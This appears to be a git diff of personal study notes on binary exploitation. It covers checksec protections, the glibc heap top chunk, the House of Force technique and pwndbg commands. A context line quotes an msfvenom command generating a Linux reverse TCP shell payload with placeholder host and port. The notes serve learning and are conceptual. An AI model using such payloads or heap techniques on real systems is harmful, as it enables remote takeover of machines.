@@ -25,6 +25,18 @@ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c -
 
 ___
 
+`checksec`: prints out the binary security settings 
+
+- **RELRO** (Relocation Read-Only):
+    + `Partial RELRO` &arr; changes a program's section layout in memory
+    + `FULL RELRO` &rarr; maps some a program's sections as read-only after initialization.
+- **NX** (No eXecute): _(also known as `DEP`?)_
+    + enforces whether the pages of memory can be executable or not.
+- **PIE** (Position Independent Executables): specifies whether addresses are known at runtime or not.
+- **Canari**: small cookie value placed at the end of each stackframe so that if there is a buffer overflow and the canari is overwritten, it stops the execution. 
+- **ASLR** (Address Space Layout Randomisation): stack, heap and libraries are loaded with random addresses.
+- **RUNPATH**: specifies whether the binary is loaded with a LIBC located in a directory that the user control.  
+
 **Data Execution Prevention** (`DEP`) is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.
 
 ___
@@ -101,9 +113,13 @@ void *ptr = malloc(wanted_size_of_allocated_memory)
 
 - **Minimum size chunk**: 3 quadwords at 24 bytes _(even if we ask less)_.
 
-- A **Top chunk** resides at the highest address of the heap. When a new chunk is allocated, this top chunk is reduced. 
+- A **Top chunk** resides at the highest address of the heap. 
 
 > As the other chunks, it has a size field.
+
+When a new chunk is allocated, this top chunk is reduced. 
+
+![top chunk](images/heap_exploitation/top_chunk.png)
 
 - <https://sourceware.org/glibc/wiki/MallocInternals>
 ___
@@ -113,6 +129,20 @@ ___
 #### House of Force
 
 In many versions of **GLIBC**, top chunk size field are not subject to integrity checks. This forms the basis of the House of Force...
+
+> Example: `libc-2.28.so`
+
+First documented in 2005 in [The Malloc Maleficarum paper](https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt) by **Phantasmal Phantasmagoria**. In this paper, the author also introduces other heap exploitation techniques (described in later sections):
+
+![house of * techniques](images/heap_exploitation/malloc_maleficarum.png)
+
+> Since then, many techniques have followed the same "house of" naming convention.
+
+**Concept**: Attackers can overwrote the heap's top chunk size field with a large value. 
+
+From `malloc()`'s perspective, if we overwrote the heap's top chunk size field, we could extend across the gap between memory map regions (**libraries**, **stack**, etc.) and then overwrite sensitive data (`__malloc_hook` for example).
+
+We can even go beyond the end of virtual address space and go back to the start at lower memory map regions (`.data`, `.plt`, etc).
 
 #### House of Orange
 #### House of Spirit
@@ -133,5 +163,16 @@ ___
 
 - `set context-sections <regs, disasm, args, code, stack, backtrace, expressions, ghidra>`: change the context displayed at each iteration (default: `registers, disasm, code, stack and backtrace`)
 - `context`: print the context
-- `vmmap`: prints memory map for current process
+- `vmmap`: prints memory map (sections) for current process
 - `vis_heap_chunks`: inspect heap memory
+- `dq <address>`: dump quadword at specific address (similar to `x/16x <address>`)
+- `xinfo <address>`: see which mapping a specific address resides at.
+- `top_chunk`: prints top chunk address and size
+
+___
+
+## Misc
+
+At runtime, a binary will use whichever GLIBC version is available on the OS it's installed on.
+
+A binary can be vulnerable to exploitation on one platform, and not vulnerable on a different platform.
